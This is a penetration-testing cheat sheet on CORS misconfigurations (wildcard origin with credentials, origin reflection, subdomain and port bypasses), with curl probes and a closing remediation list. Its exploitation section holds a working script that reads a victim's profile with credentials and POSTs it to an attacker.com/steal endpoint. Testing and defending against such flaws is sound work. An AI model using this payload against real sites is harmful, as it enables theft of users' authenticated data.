# Wildcard Credentials — Origin * with Credentials: true

## Summary
Setting `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` is mutually exclusive per spec, but some servers incorrectly combine them or use reflecting behaviour that effectively acts as a wildcard.

## Wildcard Detection

```bash
curl -I https://target.com/api/public

# Look for:
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true

# Per the CORS spec, if ACA-Origin: *, credentials *
# should be ignored by the browser, but misconfigured
# proxies, CDNs, or middleware may still send both
```

## Dynamic Wildcard via Header Reflection

Even if not literally `*`, reflection behaves like a wildcard for any origin:

```bash
# This effectively acts as a wildcard with credentials:
# Sent:         Origin: https://any-domain.com
# Received:     ACA-Origin: https://any-domain.com
#               ACA-Credentials: true

# Any website can now make authenticated cross-origin requests
```

## Testing Script

```bash
#!/bin/bash
ORIGINS=("https://evil.com" "https://attacker.org" "null" "http://evil.com")
for o in "${ORIGINS[@]}"; do
  echo "--- Origin: $o ---"
  curl -sI -H "Origin: $o" "https://target.com/api/profile" | grep -i "access-control"
done
```

## Exploitation via Dynamic Wildcard

```html
<!-- Run from attacker.com -->
<h1>Exfiltrate User Data via CORS</h1>
<script>
fetch("https://target.com/api/profile", {
  credentials: "include"
})
.then(r => r.json())
.then(data => fetch("https://attacker.com/steal", {
  method: "POST",
  body: JSON.stringify(data),
  mode: "no-cors"
}));
</script>
```

## Varying Origins by Subdomain

```bash
# Test if subdomain carry-over is allowed
curl -H "Origin: https://sub.target.com" -I https://target.com/api
curl -H "Origin: https://sub.target.com.evil.com" -I https://target.com/api

# Test port variation
curl -H "Origin: https://target.com:9999" -I https://target.com/api
```

## Remediation

- Never set `Access-Control-Allow-Origin: *` with credentials
- Use specific whitelist of origins, not reflection
- Validate the Origin header with exact string comparison

